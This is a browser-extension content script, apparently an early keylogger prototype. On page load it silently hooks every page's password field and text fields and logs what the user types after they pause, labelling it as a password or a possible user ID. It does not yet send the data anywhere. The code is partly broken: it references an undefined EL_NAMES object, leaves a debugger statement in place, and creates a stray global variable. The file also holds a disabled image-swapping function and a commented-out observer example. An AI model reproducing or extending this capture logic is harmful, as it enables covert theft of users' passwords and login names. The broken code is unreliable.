window.onload = () => {
    readUserInput();
    // replacePics();
};

const inputLogger = (inputEl, elName, typingInterval, onDoneTyping, observer) => {
    let typingTimer;
    
    //on keyup, start the countdown
    inputEl.addEventListener('keyup', () => {
        clearTimeout(typingTimer);
        typingTimer = setTimeout(() => {
            return onDoneTyping(inputEl.value, elName);
        }, typingInterval);
    });

    //on keydown, clear the countdown 
    inputEl.addEventListener('keydown', () => {
        clearTimeout(typingTimer);
    });
}

const onDoneTyping = (input, elName) => {
    debugger;
    console.log(EL_NAMES.elName + ": " + input);
};

const readUserInput = () => {
    const passwordEl = document.querySelectorAll('input[type="password"]')[0];
    const possibleUserIdEls = document.querySelectorAll('input[type="text"]');
    
    const keyStrokeTimeOut = 1500;
    if (passwordEl) {
        inputLogger(passwordEl, "password", keyStrokeTimeOut, onDoneTyping);
    }

    if (possibleUserIdEls) {
        if (possibleUserIdEls) {
            possibleUserIdEls?.forEach(idEl => {
                inputLogger(idEl, "possibleUserId", keyStrokeTimeOut, onDoneTyping);
            });
        }
    }
};

const replacePics = () => {
    const imgEls = document.querySelectorAll('img');
    const min = 1;
    const max = 3;

    imgEls?.forEach(el => {
        const index = Math.floor(Math.random() * (max - min) + min);
        const fileName = imageFileNames = 'images/cat_img_' + String(index) + '.jpg';
        const imgUrl = chrome.extension.getURL(fileName);
        el.src = imgUrl;
    });
};


// function Click() {
//     this.handlers = [];  // observers
// }
 
// Click.prototype = {
 
//     subscribe: function(fn) {
//         this.handlers.push(fn);
//     },
 
//     unsubscribe: function(fn) {
//         this.handlers = this.handlers.filter(
//             function(item) {
//                 if (item !== fn) {
//                     return item;
//                 }
//             }
//         );
//     },
 
//     fire: function(o, thisObj) {
//         var scope = thisObj || window;
//         this.handlers.forEach(function(item) {
//             item.call(scope, o);
//         });
//     }
// }

// function run() {
 
//     var clickHandler = function(item) { 
//         log.add("fired: " + item); 
//     };
 
//     var click = new Click();
 
//     click.subscribe(clickHandler);
//     click.fire('event #1');
//     click.unsubscribe(clickHandler);
//     click.fire('event #2');
//     click.subscribe(clickHandler);
//     click.fire('event #3');
 
//     log.show();
// }